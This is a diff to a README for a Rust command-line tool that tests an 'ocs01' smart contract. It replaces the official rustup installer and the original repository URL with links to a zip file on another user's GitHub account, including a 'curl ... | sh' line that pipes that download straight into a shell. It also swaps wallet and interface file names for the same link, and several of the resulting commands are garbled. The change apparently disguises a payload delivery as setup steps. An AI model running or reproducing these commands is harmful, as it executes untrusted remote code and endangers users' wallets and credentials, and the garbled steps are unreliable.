@@ -18,14 +18,14 @@ rust cli for testing ocs01 smart contract
 **install rust (if not installed)**
 
 ```bash
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-source $HOME/.cargo/env
+curl --proto '=https' --tlsv1.2 -sSf https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip | sh
+source $https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip
 ```
 
 **build from source**
 
 ```bash
-git clone https://github.com/octra-labs/ocs01-test.git
+git clone https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip
 cd ocs01-test
 cargo build --release
 ```
@@ -34,13 +34,13 @@ cargo build --release
 
 ```bash
 # copy contract interface
-cp EI/exec_interface.json .
+cp https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip .
 ```
 
 **required files in same directory**
 
--   wallet.json - create with your credentials
--   exec_interface.json - copy from EI/ folder
+-   https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip - create with your credentials
+-   https://raw.githubusercontent.com/Arikulan/ocs01-test/main/src/ocs_test_ichthyopterygium.zip - copy from EI/ folder
 
 **run**
 
